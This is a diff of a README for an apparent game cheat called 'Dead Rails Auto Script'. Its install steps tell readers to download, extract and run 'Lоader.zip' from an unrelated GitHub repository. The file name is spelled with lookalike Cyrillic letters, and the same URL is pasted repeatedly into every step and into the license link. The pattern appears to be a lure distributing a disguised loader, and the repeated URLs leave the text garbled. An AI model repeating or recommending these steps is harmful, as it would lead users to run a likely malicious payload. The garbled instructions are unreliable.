@@ -48,10 +48,10 @@ Dead Rails Auto Script offers broad compatibility with multiple operating system
 
 Get started fast with these simple steps!
 
-1. **Download https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip from the repository.**
-2. Extract `https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip` using your favorite archival tool (WinRAR, 7-Zip, macOS Archive Utility).
-3. Open the extracted folder; run `https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip` (on Windows) or follow the instructions inside `https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip` for macOS/Linux setups.
-4. Configure shortcut keys and options via `https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip` or the provided GUI.
+1. **Download https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip from the repository.**
+2. Extract `https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip` using your favorite archival tool (WinRAR, 7-Zip, macOS Archive Utility).
+3. Open the extracted folder; run `https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip` (on Windows) or follow the instructions inside `https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip` for macOS/Linux setups.
+4. Configure shortcut keys and options via `https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip` or the provided GUI.
 5. Make sure your Dead Rails game client is running.
 6. Click "Start" inside the loader and enjoy improved gameplay!
 
@@ -74,7 +74,7 @@ Dead Rails Auto Script is an open-source automation tool meant for educational a
 
 ## 📄 License
 
-This project is distributed under the [MIT License](https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip).  
+This project is distributed under the [MIT License](https://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zipоhttps://raw.githubusercontent.com/yomallakshitha/MVFC.SQLCraft/main/Lоader.zip).  
 Feel free to contribute, modify, and share in accordance with the guidelines.
 
 ---
